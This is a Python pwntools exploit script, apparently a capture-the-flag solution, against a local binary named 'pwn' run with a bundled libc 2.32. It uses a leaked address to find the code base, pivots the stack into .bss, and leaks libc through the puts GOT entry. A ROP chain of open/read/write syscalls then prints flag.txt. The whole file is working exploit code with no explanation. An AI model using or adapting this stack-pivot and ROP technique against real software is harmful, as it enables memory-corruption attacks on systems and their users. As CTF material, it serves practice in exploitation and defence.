from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux','sp','-h']


p = process(["./ld-2.32.so", "./pwn"], env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so.6")
elf = ELF("./pwn")

p.recvuntil("gift > ")
main_addr = int(p.recv(14),16)
log.info("main_addr:"+hex(main_addr))
text_base = main_addr - 0x1387
log.info("text_base:"+hex(text_base))

bss = text_base+0x4060

# elf gadget
pop_rdi_ret = text_base+0x0000000000001473
pop_rsi_r15_ret = text_base+0x0000000000001471
leave_ret = text_base+0x0000000000001310
ret = text_base+0x1409
read_gadget = text_base+0x13c6


puts_plt = text_base+0x10d0#elf.sym['puts']
log.info("puts_plt:"+hex(puts_plt))
puts_got = text_base+0x3FB0
log.info("puts_got:"+hex(puts_got))
read_got = text_base+0x3fd0

payload = 'a'*0x800#'a'*(0x800-8)+p64(bss+0x840-8)
payload += p64(pop_rdi_ret)+p64(puts_got)
payload += p64(puts_plt)
payload += p64(read_gadget)


gdb.attach(p,"b *$rebase(0x13E8)")
raw_input()

p.sendafter("payload > ",payload)

p.sendafter("stack > ",'a'*32+p64(bss+0x800-8)+p64(leave_ret))
libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.sym['puts']
log.info(hex(libc_base))

#libc gadget
pop_rdx_rbx_ret = libc_base + 0x114161 
pop_rax_ret = libc_base + 0x0000000000045580
syscall = libc_base + 0x611ea 

# open("flag.txt", 0)
payload = './flag.txt'.ljust(0x820-8, '\x00') +p64(ret)
payload += p64(pop_rdi_ret)+p64(bss) + p64(pop_rsi_r15_ret)+p64(0)*2 + p64(pop_rax_ret)+p64(2) + p64(syscall)
# read(3, target, 0x50)
payload += p64(pop_rdi_ret)+p64(3) + p64(pop_rsi_r15_ret)+p64(bss)*2 + p64(pop_rdx_rbx_ret)+p64(0x50)*2 + p64(pop_rax_ret)+p64(0) + p64(syscall)
# write(1, target, 0x50)
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rax_ret)+p64(1) + p64(syscall)
p.send(payload)

p.interactive()